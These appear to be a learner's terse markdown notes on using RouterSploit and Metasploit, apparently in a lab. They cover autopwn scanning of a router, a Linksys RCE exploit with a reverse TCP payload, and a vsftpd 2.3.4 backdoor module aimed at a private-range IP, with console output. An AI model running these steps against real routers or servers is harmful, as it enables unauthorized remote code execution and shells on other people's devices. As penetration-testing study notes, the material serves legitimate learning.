# Routersploit

blupy
apt update && apt install routersploit

https://github.com/threat9/routersploit

python3 rsf.py
cd /routerspoit
show all
search cisco
search type=exploits
search device=cameras
exit
git pull

Real Exploit. 
ping 192.168.0.1

ls
/root/routersploit

rsf.py
show options

set
run

use scanners/autopwn
show options

set target 192.168.0.1

run
use exploits/

use exploits/routers/
use exploits/routers/tplink

use exploits/routers/linksys/eseries_themoon_rce
show options
set target
run

show payloads
set payload mipsle/revers_tcp

ifconfig
set lhost ipaddress
run

## Riposte


## Reconosence


nmap target 
vsftpd

https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor

In Kali
Metasploit tip: View all productivity tips with the tips command

msf5 > search vsftpd
                                                               
Matching Modules                                               
================                                               
                                                                  
   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution               


msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 10.0.2.4
RHOST => 10.0.2.4
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.0.2.4         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic
